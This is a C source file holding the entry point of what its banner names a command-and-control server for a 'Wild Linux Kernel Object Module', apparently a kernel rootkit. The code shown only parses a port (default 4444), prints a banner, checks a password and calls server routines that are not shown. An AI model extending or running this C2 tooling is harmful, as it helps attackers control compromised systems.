#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "server.h"

#define MIN_PORT        1
#define MAX_PORT        65535
#define DEFAULT_PORT    4444

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s <port>\n"
		"  port  Port to listen on (default: 4444)\n",
		prog);
}

int main(int argc, char *argv[])
{
	int port = DEFAULT_PORT;
	int srv_fd;

	if (argc >= 2) {
		if (strcmp(argv[1], "-h") == 0 ||
				strcmp(argv[1], "--help") == 0) {
			usage(argv[0]);
			return 0;
		}
		port = atoi(argv[1]);
		if (port <= MIN_PORT || port > MAX_PORT) {
			fprintf(stderr, "Invalid port: %s\n", argv[1]);
			return 1;
		}
	}

	printf(
		"\033[1;31m"
		"██╗    ██╗██╗     ██╗  ██╗ ██████╗ ███╗   ███╗\n"
		"██║    ██║██║     ██║ ██╔╝██╔═══██╗████╗ ████║\n"
		"██║ █╗ ██║██║     █████╔╝ ██║   ██║██╔████╔██║\n"
		"██║███╗██║██║     ██╔═██╗ ██║   ██║██║╚██╔╝██║\n"
		"╚███╔███╔╝███████╗██║  ██╗╚██████╔╝██║ ╚═╝ ██║\n"
		" ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝\n"
		"\033[0m"
		"  Wild Linux Kernel Object Module - C2 Server\n\n"
	);

	if (!check_password()) {
		fprintf(stderr, "Wrong password. Bye.\n");
		return 1;
	}

	srv_fd = server_init(port);
	if (srv_fd < 0)
		return 1;

	server_run(srv_fd);
	server_close(srv_fd);
	return 0;
}
